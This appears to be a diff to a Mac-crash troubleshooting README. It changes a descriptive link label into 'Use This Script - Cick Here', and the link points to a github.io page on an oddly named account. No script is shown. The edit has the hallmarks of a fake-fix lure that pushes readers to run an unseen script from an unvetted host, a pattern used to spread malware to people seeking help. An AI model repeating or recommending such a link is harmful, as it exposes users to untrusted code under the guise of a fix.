@@ -6,7 +6,7 @@
 
 ## Mac Keeps Crashing — Kernel Panic vs Application Crash Classification, RAM and NVMe Fault Indicators
 
-> **[Full crash taxonomy and hardware fault signature diagnostic](https://error-number-472173.github.io/.github/mac-keeps-crashing)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-keeps-crashing)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Keeps Crashing, in order of architectural impact:**
 
